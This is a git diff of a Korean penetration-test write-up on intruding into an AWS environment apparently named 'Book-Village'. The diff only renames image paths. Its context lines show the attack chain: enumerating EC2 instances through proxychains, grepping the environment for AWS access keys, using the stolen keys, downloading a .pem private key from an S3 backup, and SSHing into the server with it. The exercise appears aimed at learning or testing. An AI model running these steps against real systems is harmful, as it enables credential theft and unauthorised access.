@@ -29,7 +29,7 @@ proxychains4 aws ec2 describe-instances --region ap-northeast-2 \
 --query 'Reservations[*].Instances[*].{InstanceId:InstanceId,PrivateIpAddress:PrivateIpAddress,PublicIpAddress:PublicIpAddress,State:State.Name}' \
 --output table
 ```
-![img.png](img/AWS활용 서버침투/img.png)
+![img.png](img/AWS서버침투/img.png)
 ### 분석 결과
 
 타겟 인스턴스의 내부 IP **10.0.23.181**을 확보하였다.
@@ -46,7 +46,7 @@ env | grep -iE "AWS_ACCESS_KEY|AWS_SECRET_KEY"
 ```
 
 ### 확인된 정보 예시
-![img_1.png](img/AWS활용 서버침투/img_1.png)
+![img_1.png](img/AWS서버침투/img_1.png)
 ### 확인된 정보 예시
 
 ---
@@ -73,7 +73,7 @@ export AWS_DEFAULT_REGION="ap-northeast-2"
 ```bash
 aws sts get-caller-identity
 ```
-![img_3.png](img/AWS활용 서버침투/img_3.png)
+![img_3.png](img/AWS서버침투/img_3.png)
 ---
 
 ## 4. S3 데이터 탐색
@@ -87,7 +87,7 @@ aws s3 ls s3://book-village-s3/backup/ --recursive
 aws s3 cp s3://book-village-s3/backup/Book-Village.pem ./Book-Village.pem
 chmod 400 Book-Village.pem
 ```
-![img_2.png](img/AWS활용 서버침투/img_2.png)
+![img_2.png](img/AWS서버침투/img_2.png)
 
 ---
 
@@ -98,7 +98,7 @@ chmod 400 Book-Village.pem
 ```bash
 proxychains4 ssh -i "Book-Village.pem" ubuntu@[퍼블릭IP]
 ```
-![img_4.png](img/AWS활용 서버침투/img_4.png)
+![img_4.png](img/AWS서버침투/img_4.png)
 ---
 
 ## 6. 공격 흐름 요약
